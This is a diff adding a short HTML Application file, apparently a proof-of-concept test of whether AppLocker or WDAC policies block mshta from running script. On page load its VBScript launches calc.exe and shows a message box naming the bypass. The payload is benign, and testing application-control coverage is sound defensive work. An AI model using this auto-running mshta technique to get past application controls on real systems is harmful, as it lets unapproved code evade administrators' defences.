@@ -1,0 +1,20 @@
+<html>
+<head>
+<HTA:APPLICATION
+    ID="ACtest"
+    APPLICATIONNAME="AppControlTest"
+    SINGLEINSTANCE="yes"
+    WINDOWSTATE="normal">
+</head>
+<script language="VBScript">
+    Sub RunTest
+        ' Benign proof-of-execution marker
+        Set sh = CreateObject("WScript.Shell")
+        sh.Run "calc.exe"
+        MsgBox "mshta executed script content on this host", 64, "AppLocker/WDAC bypass POC"
+    End Sub
+</script>
+<body onload="RunTest">
+    <h2>Application control test</h2>
+</body>
+</html>
